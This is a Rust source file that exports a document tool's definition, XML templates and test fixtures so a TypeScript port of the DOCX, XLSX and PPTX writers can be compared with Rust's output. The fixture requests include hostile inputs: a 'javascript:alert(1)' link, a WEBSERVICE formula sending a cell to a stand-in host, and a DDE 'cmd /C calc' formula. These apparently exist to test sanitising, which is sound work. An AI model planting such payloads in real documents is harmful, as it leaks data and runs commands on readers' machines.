//! The web client's documents (ADR-0090): the `make_document` declaration,
//! the reply the tool gives, the fixed XML parts of the three writers, and the
//! two Studio-lane tables a browser writes when it files a document.
//!
//! The browser writes the files with a TypeScript port of the writers
//! (`website/src/client/documents/`). Compiling these writers to WebAssembly
//! was weighed and refused for now: they live in the app crate (its error
//! type, `chrono`, `zip`, and `image` for slide pictures), so it would mean a
//! crate of their own, a wasm32 toolchain and `wasm-bindgen` in the site's
//! build and CI, and a few hundred kilobytes of WebAssembly, for a page of XML
//! per format. Instead the port is held to these writers part by part:
//! `documents-fixtures.json` is what Rust writes for representative requests,
//! and the website's test compares its own packages with it.

use std::io::{Cursor, Read};

use serde_json::{json, Value};

use crate::deliverables::{self, DocumentKind, MadeDocument};

/// The creation time in `docProps/core.xml` is the moment of writing; the
/// fixtures read it as this placeholder on both sides.
const CREATED: &str = "<dcterms:created xsi:type=\"dcterms:W3CDTF\">CREATED</dcterms:created>";

fn placeholder(kind: DocumentKind, warnings: Vec<String>) -> String {
    deliverables::tool_reply(&MadeDocument {
        file: "FILE_PLACEHOLDER".into(),
        path: String::new(),
        title: "TITLE_PLACEHOLDER".into(),
        kind,
        bytes: 0,
        detail: "DETAIL_PLACEHOLDER".into(),
        warnings,
    })
}

fn export() -> Value {
    use deliverables::pptx_parts as pptx;
    let replies: serde_json::Map<String, Value> =
        [DocumentKind::Docx, DocumentKind::Xlsx, DocumentKind::Pptx]
            .into_iter()
            .map(|kind| {
                (
                    kind.extension().to_string(),
                    json!({
                        "plain": placeholder(kind, Vec::new()),
                        "warned": placeholder(kind, vec!["WARNINGS_PLACEHOLDER".into()]),
                    }),
                )
            })
            .collect();
    json!({
        "generatedBy": "src-tauri/src/agent_lite/web_features/documents.rs",
        "tool": deliverables::tool_definition(),
        "replies": replies,
        "templates": {
            "docx": {
                "contentTypes": crate::docx::CONTENT_TYPES_XML,
                "rootRels": crate::docx::ROOT_RELS_XML,
                "styles": crate::docx::STYLES_XML,
            },
            "xlsx": { "rootRels": deliverables::xlsx::ROOT_RELS },
            "pptx": {
                "ns": pptx::NS,
                "rootRels": pptx::ROOT_RELS,
                "slideMaster": pptx::SLIDE_MASTER,
                "slideMasterRels": pptx::SLIDE_MASTER_RELS,
                "slideLayout": pptx::SLIDE_LAYOUT,
                "slideLayoutRels": pptx::SLIDE_LAYOUT_RELS,
                "notesMaster": pptx::NOTES_MASTER,
                "notesMasterRels": pptx::NOTES_MASTER_RELS,
                "theme": pptx::THEME,
                "presProps": pptx::PRES_PROPS,
                "viewProps": pptx::VIEW_PROPS,
                "tableStyles": pptx::TABLE_STYLES,
            },
        },
        "tables": super::tables(&["account_studio_files", "account_file_manifests"]),
    })
}

/// The requests the fixtures hold: every writer, its inferences and its
/// refusals.
fn requests() -> Vec<Value> {
    vec![
        json!({"kind": "docx", "title": "Heat pumps in old houses", "content": "# Heat pumps in old houses\n\n## Executive summary\n\nThey **work** in *most* cases [1].\nSee `COP` values, snake_case_name and 2 * 3.\n\n## Findings\n\n- Insulation first\n- Radiators sized for 55 °C\n\n1. Survey\n2. Quote\n\nText between.\n\n1) Again from one\n\n> A quoted line & <tag>\n\n| Model | COP |\n|---|---|\n| A \\| B | 3.1 |\n\n```\nlet x = 1;\n```\n\n---\n\n### Sources\n\n1. [Energy agency](https://example.org/a?b=1&c=2) and [bad](javascript:alert(1))\n"}),
        json!({"kind": "word", "title": "  Plan\nfor Q4 ", "content": {"sections": [
            {"heading": "Summary", "level": 1, "paragraphs": ["It **works**.", "Twice."]},
            {"title": "Steps", "bullets": ["One\nline", 2], "numbered": ["First", "Second"]},
            {"heading": "Costs", "level": 7, "table": {"header": ["Item", "Price"], "rows": [["A | B", 3.5], ["C"], "D", [true, null]]}},
            {"quote": "Said once\nand twice"},
            "A loose paragraph"
        ]}}),
        json!({"kind": "xlsx", "title": "Household", "content": {"sheets": [
            {
                "name": "Budget",
                "columns": [{"width": 24}, {"format": "#,##0.00"}, {"format": "0.0%"}],
                "rows": [
                    ["Item", "Cost", "Share"],
                    ["Rent & bills", 1200, "=B2/B5"],
                    ["Food <weekly>", 450.5, "=B3/B5"],
                    ["Travel", 0.1, {"formula": "B4/B5", "format": "0.00%"}],
                    [{"value": "Total", "bold": true}, "=SUM(B2:B4)", null],
                    ["Started", "2026-10-08", true],
                    ["Updated", "2026-10-08T14:30", -2.5e-7],
                    ["Big", 1.5e22, [1, "two"]]
                ]
            },
            {"name": "Budget", "rows": [["Again"], [1], [2]], "columns": [{"width": 1000}]},
            {"name": "Bad [name]: *?/\\", "header": false, "rows": [[1, 2], "solo"]},
            {"rows": [["=WEBSERVICE(\"https://e.example/?\"&A1)", "=cmd|' /C calc'!A0", "=1+1", "="]]}
        ]}}),
        json!({"kind": "excel", "title": "Q3: numbers", "content": "[[\"a\", 1], [\"b\", 2]]"}),
        json!({"kind": "pptx", "title": "Review", "content": {"slides": [
            {"title": "Quarterly review", "subtitle": "October & beyond"},
            {"title": "Highlights", "bullets": ["Revenue **up** 12%", {"text": "EMEA led", "level": 1}, {"text": "Deep", "level": 9}], "notes": "Pause here.\r\nThen ask for questions.\n"},
            {"layout": "two-column", "title": "Before and after", "left": {"heading": "Before", "bullets": ["Manual"]}, "right": ["Automated", "Audited"]},
            {"title": "The new office", "image": "abc.png", "caption": "Ground floor <lobby>"},
            {"title": "Missing picture", "image": "gone.png", "bullets": "- Still a slide\n* And another"},
            {"layout": "section", "title": "Part two", "bullets": ["Closing"]},
            {"title": "Plain", "subtitle": "Under the title", "bullets": ["A *point*"]},
            {}
        ]}}),
        json!({"kind": "pdf", "content": {}}),
        json!({"kind": "pptx", "content": {"slides": [{}]}}),
        json!({"kind": "xlsx", "content": {"text": "nothing"}}),
        json!({"kind": "docx", "content": {"sections": []}}),
    ]
}

fn parts_of(bytes: &[u8]) -> Vec<Value> {
    let mut archive = zip::ZipArchive::new(Cursor::new(bytes)).expect("a zip");
    (0..archive.len())
        .map(|index| {
            let mut file = archive.by_index(index).expect("a part");
            let name = file.name().to_string();
            let mut raw = Vec::new();
            file.read_to_end(&mut raw).expect("readable");
            let text = String::from_utf8(raw).expect("XML is UTF-8");
            let text = match (
                text.find("<dcterms:created"),
                text.find("</dcterms:created>"),
            ) {
                (Some(start), Some(end)) => format!(
                    "{}{CREATED}{}",
                    &text[..start],
                    &text[end + "</dcterms:created>".len()..]
                ),
                _ => text,
            };
            json!({ "name": name, "text": text })
        })
        .collect()
}

/// The web has no gallery: a slide's picture is reported as the app reports
/// one it cannot find.
fn no_gallery(reference: &str) -> Result<deliverables::SlideImage, String> {
    Err(format!(
        "{reference} is not a picture in the gallery, so the slide has no picture"
    ))
}

fn fixtures() -> Value {
    let cases: Vec<Value> = requests()
        .into_iter()
        .map(|request| {
            let outcome =
                deliverables::parse_request(&request).and_then(|(kind, title, content)| {
                    deliverables::build(kind, &title, &content, &no_gallery)
                        .map(|built| (kind, title, built))
                });
            match outcome {
                Ok((kind, title, built)) => json!({
                    "request": request,
                    "kind": kind,
                    "title": title,
                    "detail": built.detail,
                    "warnings": built.warnings,
                    "parts": parts_of(&built.bytes),
                }),
                Err(error) => json!({ "request": request, "error": error.message }),
            }
        })
        .collect();
    json!({
        "generatedBy": "src-tauri/src/agent_lite/web_features/documents.rs",
        "cases": cases,
    })
}

#[test]
fn the_web_client_reads_what_rust_says() {
    super::written("documents", export());
}

#[test]
fn the_web_writers_are_held_to_what_rust_writes() {
    super::written("documents-fixtures", fixtures());
}
